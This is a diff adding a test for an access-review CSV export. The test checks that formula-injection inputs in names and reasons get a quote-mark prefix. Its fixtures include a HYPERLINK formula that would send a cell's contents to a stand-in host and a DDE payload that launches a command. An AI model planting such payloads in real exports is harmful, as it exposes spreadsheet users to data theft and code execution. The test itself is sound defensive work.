@@ -96,6 +96,17 @@ test("the access review export has one line per role grant and no system account
   assert.equal(csv.length, 1 + 7);
 });
 
+test("the access review export neutralises names and reasons a spreadsheet would run as formulas", () => {
+  const payloads = ["=1+1", "+1+1", "-1+1", "@SUM(1,1)", '=HYPERLINK("https://example.invalid/?d="&B3,"Open")'];
+  const people: PrincipalView[] = payloads.map((name, i) => ({ id: `8c1e0000-0000-4000-8000-0000000001${String(i).padStart(2, "0")}`, email: `p${i}@contoso.example`, display_name: name, disabled_at: null, capabilities: ["read"], role_grants: [{ ...grant(`1${i}`, "viewer"), reason: "=cmd|' /C calc'!A0" }] }));
+  const csv = accessReviewCsv(people, NOW);
+  for (const name of payloads) assert.ok(csv.includes(`'${name}`) || csv.includes(`"'${name.replaceAll('"', '""')}"`), `${JSON.stringify(name)} is prefixed`);
+  for (const line of csv.trim().split("\n").slice(1)) {
+    assert.match(line, /^"?'/, "the name cell starts with a quote mark");
+    assert.match(line, /,"?'=cmd/, "the reason cell starts with a quote mark");
+  }
+});
+
 test("each control reaches its guarded route with the body it takes", async () => {
   const calls: { url: string; body: unknown }[] = [];
   const original = globalThis.fetch;
